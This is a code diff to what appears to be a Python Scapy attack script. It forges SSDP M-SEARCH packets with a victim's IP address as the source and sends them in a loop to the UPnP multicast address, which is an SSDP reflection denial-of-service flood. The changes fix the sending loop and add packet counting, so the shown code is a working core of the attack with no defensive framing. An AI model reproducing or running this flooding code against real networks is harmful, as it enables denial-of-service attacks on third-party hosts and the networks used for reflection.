@@ -19,7 +19,6 @@ target_ip = namespace.victim
 duration = namespace.duration
 interval = namespace.interval/1000
 p_number = namespace.process
-spoofed_packets = list()
 
 msg = \
      'M-SEARCH * HTTP/1.1\r\n' \
@@ -28,16 +27,17 @@ msg = \
      'MX:2\r\n' \
      'MAN: "ssdp:discover"\r\n' \
      '\r\n'
-
 spoofed_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=target_ip, dst="239.255.255.250") / UDP(sport=3333, dport=1900) / msg
-spoofed_packets.append(packet)
-
 END = time.time() + duration
 
 def attack():
+     pkt_cnt = 0
      while time.time() < END:
-         sendp(spoofed_packet)
-     time.sleep(interval)
+          sendp(spoofed_packet)
+          pkt_cnt+=1
+          time.sleep(interval)
+     time.sleep(2)
+     print(os.getpid(), pkt_cnt)
 
 def main():
      processes = list()
